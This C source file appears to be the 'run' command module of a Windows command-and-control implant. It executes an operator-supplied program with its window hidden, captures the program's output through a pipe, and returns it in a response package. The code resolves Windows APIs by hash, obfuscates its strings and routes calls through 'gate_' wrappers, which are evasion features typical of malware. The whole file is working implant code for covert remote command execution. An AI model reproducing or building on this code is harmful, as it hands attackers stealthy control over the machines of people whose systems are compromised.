#include "config.h"
#ifdef INCLUDE_CMD_RUN

#include "commands.h"
#include "common.h"

// run <executable> [arguments]: execute and capture stdout/stderr
VOID cmd_run(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD exe_len = 0, arg_len = 0;
    char* exe = parser_string(args, &exe_len);
    char* cargs = parser_string(args, &arg_len);
    if (!exe || exe_len == 0) {
        package_add_string(inst, response, XSTR("No executable specified"));
        response->is_error = TRUE;
        return;
    }

    // quote the executable if it contains spaces and isn't quoted already
    char cmd_line[2048] = {0};
    DWORD pos = 0;
    BOOL has_space = FALSE;
    for (DWORD i = 0; i < exe_len; i++) {
        if (exe[i] == ' ') { has_space = TRUE; break; }
    }
    if (has_space && exe[0] != '"') cmd_line[pos++] = '"';
    for (DWORD i = 0; i < exe_len && pos < sizeof(cmd_line) - 2; i++)
        cmd_line[pos++] = exe[i];
    if (has_space && exe[0] != '"') cmd_line[pos++] = '"';
    if (cargs && arg_len > 0 && pos < sizeof(cmd_line) - 2) {
        cmd_line[pos++] = ' ';
        for (DWORD i = 0; i < arg_len && pos < sizeof(cmd_line) - 2; i++)
            cmd_line[pos++] = cargs[i];
    }

    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    typedef BOOL (WINAPI *fnCreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
    fnCreatePipe pCreatePipe = (fnCreatePipe)resolve_function(inst->Modules.Kernel32, hash_string_djb2(XSTR("CreatePipe")));
    if (!pCreatePipe) {
        package_add_string(inst, response, XSTR("CreatePipe resolve failed"));
        response->is_error = TRUE;
        return;
    }
    if (!pCreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        package_add_string(inst, response, XSTR("CreatePipe failed"));
        response->is_error = TRUE;
        return;
    }

    STARTUPINFOA si;
    es_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    es_memset(&pi, 0, sizeof(pi));

    BOOL ok = inst->Win32.CreateProcessA(
        NULL, cmd_line, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    gate_CloseHandle(inst, hWritePipe);

    if (!ok) {
        gate_CloseHandle(inst, hReadPipe);
        char err[128] = {0};
        const char* prefix = XSTR("Failed to execute: ");
        DWORD p = 0;
        for (; prefix[p] && p < 100; p++) err[p] = prefix[p];
        for (DWORD i = 0; exe[i] && p < 126; i++) err[p++] = exe[i];
        package_add_string(inst, response, err);
        response->is_error = TRUE;
        return;
    }

    gate_WaitForSingleObject(inst, pi.hProcess, 30000);

    // Non-blocking drain: PeekNamedPipe + bounded wait. A blocking ReadFile
    // here hangs forever if conhost (spawned for the child console) inherits
    // the write handle and outlives cmd.exe.
    BYTE read_buf[4096];
    DWORD read_bytes;
    DWORD waited = 0;
    while (waited < 60000) {
        DWORD avail = 0;
        if (!inst->Win32.PeekNamedPipe(hReadPipe, NULL, 0, NULL, &avail, NULL))
            break; // pipe closed
        if (avail > 0) {
            if (!inst->Win32.ReadFile(hReadPipe, read_buf, sizeof(read_buf), &read_bytes, NULL) || read_bytes == 0)
                break;
            package_add_bytes(inst, response, read_buf, read_bytes);
        } else {
            if (gate_WaitForSingleObject(inst, pi.hProcess, 0) != 0x102 /*WAIT_TIMEOUT*/) {
                // process gone and pipe drained
                break;
            }
            typedef void (WINAPI *fn_Sleep_t)(DWORD);
            inst->Win32.Sleep(50);
            waited += 50;
        }
    }

    gate_CloseHandle(inst, pi.hProcess);
    gate_CloseHandle(inst, pi.hThread);
    gate_CloseHandle(inst, hReadPipe);
}

#endif
